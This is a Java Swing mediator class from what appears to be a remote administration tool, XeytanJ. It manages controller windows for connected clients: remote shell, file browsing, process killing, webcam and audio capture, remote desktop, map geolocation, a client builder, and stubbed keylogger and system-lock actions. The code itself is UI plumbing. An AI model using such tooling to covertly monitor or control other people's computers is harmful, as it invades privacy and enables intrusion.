package com.melardev.xeytanj.gui.mediator.swing;

import com.melardev.xeytanj.IApplication;
import com.melardev.xeytanj.enums.*;
import com.melardev.xeytanj.errors.NotOpenedWindowException;
import com.melardev.xeytanj.gui.IGui;
import com.melardev.xeytanj.gui.IGuiUserOwned;
import com.melardev.xeytanj.gui.builder.BuilderGUI;
import com.melardev.xeytanj.gui.camera.CameraGUI;
import com.melardev.xeytanj.gui.chat.ChatGUI;
import com.melardev.xeytanj.gui.desktop.RemoteDesktopGui;
import com.melardev.xeytanj.gui.disclaimer.DisclaimerDialog;
import com.melardev.xeytanj.gui.filesystem.FileSystemGui;
import com.melardev.xeytanj.gui.info.InfoGUI;
import com.melardev.xeytanj.gui.language.GUILanguages;
import com.melardev.xeytanj.gui.main.MainGui;
import com.melardev.xeytanj.gui.main.MainUiListener;
import com.melardev.xeytanj.gui.mediator.IUiMediator;
import com.melardev.xeytanj.gui.notify.ConnectionFrame;
import com.melardev.xeytanj.gui.notify.DialogFactory;
import com.melardev.xeytanj.gui.process.ProcessListGui;
import com.melardev.xeytanj.gui.shell.ShellGUI;
import com.melardev.xeytanj.maps.MapsBrowser;
import com.melardev.xeytanj.models.*;
import com.melardev.xeytanj.preferences.GUIPreferences;
import com.melardev.xeytanj.services.IAppMessageProvider;
import com.melardev.xeytanj.services.logger.ILogger;
import org.springframework.stereotype.Service;

import javax.swing.*;
import java.awt.*;
import java.util.List;
import java.util.*;
import java.util.function.Function;
import java.util.function.Predicate;
import java.util.stream.Collectors;

@Service
public class SwingMediator implements IUiMediator {

    private final UUID ROOT_ID = UUID.randomUUID();


    private Map<UUID, List<WindowInfoStructure>> openedWindows;

    private IApplication application;
    private Integer id;
    private IAppMessageProvider appMessageProvider;
    private ILogger logger;

    public SwingMediator() {
        id = 0;
        openedWindows = new HashMap<>();
    }

    // Show () methods
    @Override
    public void showLanguageSelectorDialog() {
        // TODO: Change by IDisclaimerDialog
        logger.traceCurrentMethodName();
        IGui dlg = new GUILanguages();
        buildAndShow(dlg);
    }


    @Override
    public void showDisclaimerDialog() {
        logger.traceCurrentMethodName();
        DisclaimerDialog dlg = new DisclaimerDialog();
        buildAndShow(dlg);
    }

    @Override
    public void showInstaller() {
        logger.traceCurrentMethodName();
    }

    @Override
    public void showDialogMessageError(String message) {
        logger.traceCurrentMethodName();
        JOptionPane.showConfirmDialog(null, message,
                "Error", JOptionPane.ERROR_MESSAGE);
    }

    @Override
    public void showMainFrame(MainUiListener listener) {
        logger.traceCurrentMethodName();
        MainGui gui = new MainGui();
        gui.setMessageProvider(appMessageProvider);
        buildAndShow(gui);
    }

    @Override
    public void showClientInfo(Client client, Map<String, String> envMap, Map<String, String> properties) {
        logger.traceCurrentMethodName();
        InfoGUI gui = new InfoGUI();

        String envStr = envMap.entrySet().stream().map(Object::toString).collect(Collectors.joining("<br/>"));
        String basic = client.getLocalIp() + " " + client.getGlobalIp();
        String propsStr = properties.entrySet().stream().map(Object::toString).collect(Collectors.joining("<br />"));
        gui.setData(basic, envStr, propsStr);

        WindowInfoStructure w = buildShowAndAssignToOwner(client, gui);
    }

    public void showNewClientNotification(Client client) {
        logger.traceCurrentMethodName();
        String country = client.getGeoData().getCountry();
        String os = client.getOs();

        // I have not uploaded to Github all country flags, so use a default for Morocco

        /*
         if (country == null || country.isEmpty())
            country = "Morocco";
        */

        country = "Morocco";
        String ctr = "icons/flags/" + country + ".png";
        String osIconPath = "";
        if (os.toLowerCase().contains("windows"))
            osIconPath = "icons/os/windows_32.png";
        else if (os.toLowerCase().contains("android"))
            osIconPath = "icons/os/android_48.png";
        else if (os.toLowerCase().contains("linux"))
            osIconPath = "icons/os/linux_32.png";

        //new Thread(() -> DialogFactory.getFrame(FrameType.NEW_CONNECTION, ctr, o, pcName, globalIp)).initServer();
        String finalOsIconPath = osIconPath;
        new Thread(() -> ((ConnectionFrame) DialogFactory.getFrame(DialogFactory.FrameType.NEW_CONNECTION))
                .setPCName(client.getPcName())
                .setIconFlag(ctr).setIconOS(finalOsIconPath).setIP(client.getGlobalIp())
                .animate())
                .start();
    }


    @Override
    public void updateProcessInfoWindow(Client client, List<ProcessStructure> processStructures) {
        //getOpenedWindowFromClient(clientId, Process)
        logger.traceCurrentMethodName();
        IGuiUserOwned gui = new ProcessListGui();
        WindowInfoStructure w = buildShowAndAssignToOwner(client, gui);
        ((ProcessListGui) gui).populateTable(processStructures);
    }

    @Override
    public void showShellWindow(Client client) {
        logger.traceCurrentMethodName();
        WindowInfoStructure w = buildShowAndAssignToOwner(client, new ShellGUI());
    }


    @Override
    public void notifyShellWindowDisconnectedForClient(Client client) {
        logger.traceCurrentMethodName();
        WindowInfoStructure w = getOpenedWindowFromClient(client, ShellGUI.class);
        if (w == null)
            return;

        ((ShellGUI) w.getFrame()).notifyDisconnected();
    }

    @Override
    public void notifyCameraSessionClosedForClient(Client client) {
        logger.traceCurrentMethodName();
        WindowInfoStructure w = getOpenedWindowFromClient(client, CameraGUI.class);
        if (w == null || w.getFrame() == null)
            return;
        CameraGUI gui = (CameraGUI) w.getFrame();
        gui.setStatus("User is disconnected");
    }

    @Override
    public void showFileExplorerWindow(Client client) {
        logger.traceCurrentMethodName();
        buildShowAndAssignToOwner(client, new FileSystemGui());
    }

    @Override
    public void updateFileSystemView(Client client, FileInfoStructure[] fileInfoStructures) {
        logger.traceCurrentMethodName();
        WindowInfoStructure w = getOpenedWindowFromClient(client, FileSystemGui.class);
        if (w == null || w.getFrame() == null)
            return;
        ((FileSystemGui) w.getFrame()).updateFilesystemView(fileInfoStructures);
    }

    @Override
    public void playAudioFromCamera(Client client, byte[] data, int bytesRead) {
        logger.traceCurrentMethodName();
        WindowInfoStructure w = getOpenedWindowFromClient(client, CameraGUI.class);
        if (w == null || w.getFrame() != null)
            return;
        ((CameraGUI) w.getFrame()).playAudio(data, bytesRead);
    }

    @Override
    public void playAudioFile(Client client, byte[] data) {
        logger.traceCurrentMethodName();
        WindowInfoStructure w = getOpenedWindowFromClient(client, CameraGUI.class);
        if (w == null || w.getFrame() == null)
            return;

        ((CameraGUI) w.getFrame()).playAudio(data, data.length);
    }

    @Override
    public void showChatMessage(Client client, String message) {
        logger.traceCurrentMethodName();
        WindowInfoStructure w = getOpenedWindowFromClient(client, ChatGUI.class);
        if (w == null || w.getFrame() == null) {
            w = buildShowAndAssignToOwner(client, new ChatGUI());
        }

        ((ChatGUI) w.getFrame()).appendMsg(message);
    }

    @Override
    public void showChatWindow(Client client) {
        logger.traceCurrentMethodName();
        buildShowAndAssignToOwner(client, new ChatGUI());
    }

    @Override
    public void disableChat(Client client) {
        WindowInfoStructure chatUiInfo = getOpenedWindowFromClient(client.getId(), ChatGUI.class);
        if (chatUiInfo != null)
            ((IGuiUserOwned) chatUiInfo.getFrame()).disableUi();
    }


    private <T extends IGui> T getOpenedWindow(Class<T> uiClazz) {
        logger.traceCurrentMethodName();
        return getOpenedWindow(ROOT_ID, uiClazz);
    }

    @Override
    public void onProcessKillRequest(Client client, int pid) {
        logger.traceCurrentMethodName();
        application.onProcessKillRequest(client, pid);
    }

    @Override
    public void updateRemoteDesktopWindow(Client client, ImageIcon image) {
        logger.traceCurrentMethodName();
        WindowInfoStructure windowInfoStructure = getOpenedWindowFromClient(client, RemoteDesktopGui.class);
        RemoteDesktopGui gui = (RemoteDesktopGui) windowInfoStructure.getFrame();
        gui.setDesktopImage(image);
    }


    @Override
    public void showOrUpdateRemoteDesktopConfigInfo(Client client, List<ScreenDeviceInfo> config) {
        logger.traceCurrentMethodName();
        EventQueue.invokeLater(() -> {
            WindowInfoStructure window = getOpenedWindowFromClient(client, RemoteDesktopGui.class);
            RemoteDesktopGui gui = null;
            if (window == null) {
                gui = new RemoteDesktopGui();
                window = buildShowAndAssignToOwner(client, gui);
            } else
                gui = (RemoteDesktopGui) window.getFrame();

            if (config != null)
                gui.setConfig(config);
        });
    }

    @Override
    public void closeRemoteDesktopWindow(Client client) {
        logger.traceCurrentMethodName();
        WindowInfoStructure window = getOpenedWindowFromClient(client, RemoteDesktopGui.class);
    }

    @Override
    public void showOrUpdateRemoteCameraUi(Client client, List<CameraDeviceInfo> availableCameras) {
        logger.traceCurrentMethodName();
        WindowInfoStructure w = getOpenedWindowFromClient(client, CameraGUI.class);
        if (w == null) {
            CameraGUI cameraGui = new CameraGUI();
            w = buildShowAndAssignToOwner(client, cameraGui);
        }

        if (availableCameras != null)
            ((CameraGUI) w.getFrame()).updateUi(availableCameras);
    }

    @Override
    public void showOrUpdateRemoteCameraUi(Client client, Icon image) {
        logger.traceCurrentMethodName();
        WindowInfoStructure w = getOpenedWindowFromClient(client, CameraGUI.class);
        if (w == null)
            return;

        ((CameraGUI) w.getFrame()).updateUi(image);
    }

    @Override
    public void showRoots(Client client, FileInfoStructure[] fileInfoStructures) {
        logger.traceCurrentMethodName();
        WindowInfoStructure w = getOpenedWindowFromClient(client, FileSystemGui.class);
        if (w == null) {
            FileSystemGui gui = new FileSystemGui();
            w = buildShowAndAssignToOwner(client, gui);
        }
        ((FileSystemGui) w.getFrame()).showRoots(fileInfoStructures);
    }

    @Override
    public void onLanguageSelected(Language lang) {
        logger.traceCurrentMethodName();
        WindowInfoStructure dlg = getWindowInfoFromOpenedWindow(ROOT_ID, GUILanguages.class);
        application.onLanguageSelected(lang);
        dlg.getFrame().dispose();
    }

    @Override
    public void onLanguageUiClosed() {
        logger.traceCurrentMethodName();
        application.onLanguageUiClosed();
    }

    @Override
    public void onDisclaimerAccepted() {
        logger.traceCurrentMethodName();
        WindowInfoStructure dlg = getWindowInfoFromOpenedWindow(ROOT_ID, DisclaimerDialog.class);
        dlg.getFrame().dispose();
        application.onDisclaimerAccepted();
    }

    @Override
    public void onDisclaimerRefused() {
        logger.traceCurrentMethodName();
        application.onDisclaimerRefused();
    }

    @Override
    public void onExitRequested() {
        logger.traceCurrentMethodName();
    }

    //@Override
    public void onShowClientInfo(UUID uuid) {
        logger.traceCurrentMethodName();
        application.onShowClientInfo(uuid);
    }

    //@Override
    public void onRemoteShellRequested(UUID id) {
        logger.traceCurrentMethodName();
        application.onRemoteShellRequested(id);
    }

    //@Override
    public void onProcessListClicked(ProcessInfoDetails infoLevel, UUID id) {
        logger.traceCurrentMethodName();
        application.onProcessListClicked(infoLevel, id);
    }

    @Override
    public void onCameraStartRequested(NetworkProtocol protocol, UUID id) {
        logger.traceCurrentMethodName();
        application.onCameraStartRequested(protocol, id);
    }

    @Override
    public void onRemoteDesktopClicked(UUID id) {
        logger.traceCurrentMethodName();
        application.onRemoteDesktopClicked(id);
    }

    @Override
    public void onRemoteFileManagerClicked(UUID id) {
        logger.traceCurrentMethodName();
        application.onRemoteFileManagerClicked(id);
    }

    @Override
    public void onStartChatRequested(UUID id) {
        logger.traceCurrentMethodName();
        application.onStartChatRequested(id);
    }

    @Override
    public void onTurnOnOffDisplayClicked(UUID id, boolean on) {
        logger.traceCurrentMethodName();
    }

    @Override
    public void onRebootClicked(UUID id) {
        logger.traceCurrentMethodName();
    }

    @Override
    public void onShutdownClicked(UUID id) {
        logger.traceCurrentMethodName();
    }

    @Override
    public void onLogOffSystem(UUID id) {
        logger.traceCurrentMethodName();
    }

    @Override
    public void onLockSystemClicked(UUID id) {
        logger.traceCurrentMethodName();
    }

    @Override
    public void onSessionKeyloggerClicked(UUID id) {
        logger.traceCurrentMethodName();
    }

    @Override
    public void onVoIpRawClicked(UUID id) {
        logger.traceCurrentMethodName();
    }

    @Override
    public void onVoIpClicked(UUID id) {
        logger.traceCurrentMethodName();
        application.onVoIpClicked(id);
    }

    @Override
    public void showBuilderWindow(String defaultOutputPath) {
        logger.traceCurrentMethodName();
        BuilderGUI gui = new BuilderGUI();
        gui.setDefaultOutputPath(defaultOutputPath);
        buildAndShow(gui);
    }

    @Override
    public void onBuildRequested(BuildClientInfoStructure buildClientInfoStructure) {
        logger.traceCurrentMethodName();
        application.onBuildClientRequested(buildClientInfoStructure);
    }

    @Override
    public void onBuilderShowClicked() {
        logger.traceCurrentMethodName();
        application.onBuilderShowClicked();
    }

    @Override
    public void showErrorMessage(String message) {
        showErrorMessage("Error", message);
    }

    @Override
    public void showErrorMessage(String title, String message) {
        showMessage(title, message, JOptionPane.ERROR_MESSAGE);
    }

    @Override
    public void showMapRequested() {
        application.onShowMapRequested();
    }

    @Override
    public void showMap(String googleKey, ArrayList<Client> locations) {

        MapsBrowser mapUi = new MapsBrowser();
        mapUi.setClientLocations(locations);
        mapUi.setGoogleMapsKey(googleKey);
        buildAndShow(mapUi);
    }

    public void showMessage(String title, String message, int messageType) {
        SwingUtilities.invokeLater(() -> {
            JOptionPane.showMessageDialog(null, message, title, messageType);
        });
    }

    // =========================================================
    // Ui Updaters
    // =========================================================

    @Override
    public void addClientRowTable(Client client) {
        showNewClientNotification(client);
        logger.traceCurrentMethodName();
        MainGui window = getOpenedWindow(ROOT_ID, MainGui.class);
        EventQueue.invokeLater(() -> {
            window.addClient(client);
        });
    }

    @Override
    public void onClientDisconnected(Client client) {
        logger.traceCurrentMethodName();
        MainGui gui = getOpenedWindow(ROOT_ID, MainGui.class);
        gui.deleteRow(client.getId());
        disableAllUserOwnedUis(client.getId());
    }


    private void disableAllUserOwnedUis(UUID id) {
        List<WindowInfoStructure> windows = getOpenedWindowsFromClient(id);

        if (windows == null || windows.size() == 0) return;

        for (WindowInfoStructure ui : windows) {
            ((IGuiUserOwned) ui.getFrame()).disableUi();
        }
    }

    @Override
    public void closeBuilderUi() {
        logger.traceCurrentMethodName();
        BuilderGUI gui = getOpenedWindow(BuilderGUI.class);
        gui.dispose();
    }

    @Override
    public void appendShellOutput(Client client, String text) {
        logger.traceCurrentMethodName();
        WindowInfoStructure w = getOpenedWindowFromClient(client, ShellGUI.class);
        if (w == null) {
            ShellGUI gui = new ShellGUI();
            w = buildShowAndAssignToOwner(client, gui);
        }
        ((ShellGUI) w.getFrame()).appendText(text);
    }

    @Override
    public void closeAllUserOwnedWindows(Client client) {
        logger.traceCurrentMethodName();
        List<WindowInfoStructure> clientWindows = getOpenedWindowsFromClient(client);

        clientWindows.forEach(g -> {
            g.getFrame().dispose();
        });

        openedWindows.remove(client.getId());
    }

    private List<WindowInfoStructure> getOpenedWindowsFromClient(Client client) {
        return getOpenedWindowsFromClient(client.getId());
    }

    private List<WindowInfoStructure> getOpenedWindowsFromClient(UUID clientId) {
        logger.traceCurrentMethodName();
        return openedWindows.get(clientId);
    }

    private <T extends IGuiUserOwned> WindowInfoStructure buildShowAndAssignToOwner(Client client, T gui) {
        logger.traceCurrentMethodName();
        WindowInfoStructure info = buildAndShow(client, gui);
        info.setIdBelongsTo(client.getId());
        ((IGuiUserOwned) info.getFrame()).setClient(client);
        return info;
    }

    private WindowInfoStructure buildAndShow(IGui gui) {
        return buildAndShow(null, gui);
    }

    private WindowInfoStructure buildAndShow(Client client, IGui gui) {
        logger.traceCurrentMethodName();
        WindowInfoStructure windowInfoStructure = new WindowInfoStructure(0, gui, this);

        gui.addListener(this);
        gui.setMediator(this);
        gui.setMessageProvider(appMessageProvider);
        gui.display();

        UUID clientId = client == null ? ROOT_ID : client.getId();

        if (openedWindows.containsKey(clientId))
            openedWindows.get(clientId).add(windowInfoStructure);
        else {
            LinkedList<WindowInfoStructure> list = new LinkedList<>();
            list.add(windowInfoStructure);
            openedWindows.put(clientId, list);
        }

        return windowInfoStructure;
    }

    // ==================================================
    // Callbacks triggered from Ui
    // ==================================================
    @Override
    public void onPreferencesClicked() {
        logger.traceCurrentMethodName();
        new GUIPreferences().display();
    }

    @Override
    public void onCloseConnectionClicked(UUID uuid) {
        application.onCloseConnectionClicked(uuid);
    }

    @Override
    public void onUninstallClicked(UUID uuid) {
        application.onUninstallClicked(uuid);
    }


    @Override
    public void onRdpStopBtnClicked(Client client) {
        logger.traceCurrentMethodName();
        application.onRemoteDesktopStopRequested(client);
    }

    @Override
    public void onRdpPauseBtnClicked(Client client) {
        logger.traceCurrentMethodName();
        WindowInfoStructure window = getOpenedWindowFromClient(client, RemoteDesktopGui.class);
        application.onRemoteDesktopPauseRequested(client);
    }

    @Override
    public void onRdpPlayBtnClicked(Client client, NetworkProtocol networkProtocol, String displayName, int scaleX, int scaleY, int delay) {
        logger.traceCurrentMethodName();
        application.onRemoteDesktopPlayRequested(client, networkProtocol, displayName, scaleX, scaleY, delay);
    }

    @Override
    public void onCameraPlayClicked(Client client, NetworkProtocol protocol, int cameraId, boolean shouldRecordAudio, int interval) {
        logger.traceCurrentMethodName();
        application.onRemoteCameraPlayRequested(client, NetworkProtocol.TCP, cameraId, shouldRecordAudio, interval);
    }

    @Override
    public void onCameraPauseClicked(Client client) {
        application.onCameraPauseRequested(client);
    }

    @Override
    public void onFileSystemPathRequested(Client client, String fileSystemPath) {
        logger.traceCurrentMethodName();
        application.onFileSystemPathRequested(client, fileSystemPath);
    }

    @Override
    public void onSendShellCommandRequested(Client client, String text) {
        logger.traceCurrentMethodName();
        application.onSendShellCommandRequested(client, text);
    }

    public void playRaw(UUID id, byte[] data, int bytesRead) {/*
        WindowInfoStructure w = getOpenedWindowFromClient(id, com.melardev.xeytanj.gui.sound.AudioMediaPlayer);
        if (w != null && w.getFrame() != null)
            ((AudioMediaPlayer) w.getFrame()).playRaw(data,bytesRead);*/
    }

    @Override
    public void onTestConnection(DbType dbType, String host, Long port, String username, String password) {
        logger.traceCurrentMethodName();
    }

    @Override
    public void onSendChatMessage(Client client, String text) {
        logger.traceCurrentMethodName();
        application.onSendChatMessage(client, text);
    }

    // Close() ers
    @Override
    public <T> void onWindowClose(IGui gui) {
        logger.trace("Closed " + gui.getClass());
        WindowInfoStructure w = getWindowInfoFromOpenedWindow(ROOT_ID, gui.getClass());
        openedWindows.get(ROOT_ID).remove(w);
    }

    @Override
    public void onWindowUserOwnedClose(Client client, IGuiUserOwned gui, ServiceType serviceType) {
        logger.trace("Closed " + gui.getClass());
        WindowInfoStructure w = getOpenedWindowFromClient(client, gui.getClass());
        if (w == null)
            return;
        List<WindowInfoStructure> windowsFromUser = openedWindows.get(client.getId());
        windowsFromUser.remove(w);
        application.onWindowUserOwnedClosed(client, serviceType);
        w = null;
        if (windowsFromUser.size() == 0)
            openedWindows.remove(client.getId());

    }

    // ======================================================================
    //              Getters
    // ======================================================================
    private <T extends IGui> WindowInfoStructure getWindowInfoFromOpenedWindow(UUID id, Class<T> clazz) {
        logger.traceCurrentMethodName();
        return openedWindows.get(id).stream().filter(new Predicate<WindowInfoStructure>() {
            @Override
            public boolean test(WindowInfoStructure windowsInfoStructure) {
                return windowsInfoStructure.getFrame().getClass() == clazz;
            }
        }).findFirst().orElseThrow(NotOpenedWindowException::new);
    }

    private <T extends IGui> WindowInfoStructure getOpenedWindowFromClient(Client client, Class<T> guiClass) {
        return getOpenedWindowFromClient(client.getId(), guiClass);
    }

    private <T extends IGui> WindowInfoStructure getOpenedWindowFromClient(UUID clientId, Class<T> guiClass) {
        logger.traceCurrentMethodName();
        List<WindowInfoStructure> windows = openedWindows.get(clientId);
        if (windows == null)
            return null;
        return windows.stream().filter(new Predicate<WindowInfoStructure>() {
            @Override
            public boolean test(WindowInfoStructure windowInfoStructure) {
                return windowInfoStructure.getFrame().getClass() == guiClass
                        && windowInfoStructure.getIdBelongsTo() != null &&
                        windowInfoStructure.getIdBelongsTo() == clientId;
            }
        }).findFirst().orElse(null);
    }

    private <T extends IGui> T getOpenedWindow(UUID id, Class<T> clazz) {
        logger.traceCurrentMethodName();
        return openedWindows.get(id).stream().filter(new Predicate<WindowInfoStructure>() {
            @Override
            public boolean test(WindowInfoStructure windowsInfoStructure) {
                return windowsInfoStructure.getFrame().getClass() == clazz;
            }
        }).map(new Function<WindowInfoStructure, T>() {
            @Override
            public T apply(WindowInfoStructure windowsInfoStructure) {
                return (T) windowsInfoStructure.getFrame();
            }
        }).findFirst().orElseThrow(NotOpenedWindowException::new);
    }

    // Setters
    @Override
    public void setMessageProvider(IAppMessageProvider messageProvider) {
        this.appMessageProvider = messageProvider;
    }

    @Override
    public void setApplication(IApplication application) {
        this.application = application;
    }

    @Override
    public void setLogger(ILogger logger) {
        this.logger = logger;
    }

}
